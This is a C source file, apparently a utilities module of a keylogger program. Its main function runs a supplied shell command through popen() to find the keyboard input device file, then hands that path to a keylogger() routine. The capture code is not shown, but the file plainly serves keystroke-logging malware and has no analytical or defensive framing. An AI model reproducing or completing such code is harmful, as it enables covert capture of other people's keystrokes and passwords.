#include <stdlib.h>
#include <stdio.h>  // popen()
#include <errno.h>  //errno
#include <string.h>  // strerror()

#include "../includes/keylogger.h"
#include "../includes/utils.h"


void error(const char *expression)
{
    printf("ERROR : %s\nError Number : %d\nError Message : %s\n", expression, errno, strerror(errno));
    exit(1);
}

void get_kb_device_filename(const char *command)
{
    char buffer[128] = "";
    char defaultPath[128] = "";
    char *deviceFile = NULL;

    FILE *pipe = NULL;

    pipe = popen(command, "r");
    if(pipe == NULL)
        error("popen()\nFonction : get_kb_device_filename()");

    if(fgets(buffer, 128, pipe) == NULL)
        error("fgets()\nFonction : get_kb_device_filename()");

    buffer[strlen(buffer) - 1] = 0;

    strcat(defaultPath, buffer);

    //printf("device : %s\n", defaultPath);

    deviceFile = malloc ((strlen (defaultPath) + 1) * sizeof (*deviceFile));
    if(deviceFile == NULL)
        error("malloc()\nFonction : get_kb_device_filename()");

    strcpy(deviceFile, defaultPath);

    keylogger(deviceFile);

}

